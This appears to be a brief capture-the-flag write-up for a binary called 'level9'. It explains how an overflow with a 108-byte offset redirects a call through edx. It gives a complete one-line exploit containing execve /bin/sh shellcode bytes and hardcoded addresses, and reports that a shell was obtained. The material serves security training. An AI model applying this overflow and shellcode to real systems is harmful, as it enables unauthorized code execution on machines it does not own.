cpp binary

it needs two arguments 

we find the offset of the first argument (108 bytes)

eax is dereferenced twice, the second time its value it put inside edx, which is then called

let's try and put some shellcode in edx

for this we need a pointer to the beggining of the stack

exploit = shellcode_address + shellocde + buffer_to_overflow + address_pointing_to_shellcode_address 

shellcode is the same as in level2: http://shell-storm.org/shellcode/files/shellcode-575.php

./level9 `python -c 'print("\x10\xa0\x04\x08" + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80" + "a" * 83 + "\x0c\xa0\x04\x08")'`

we are inside a shell !
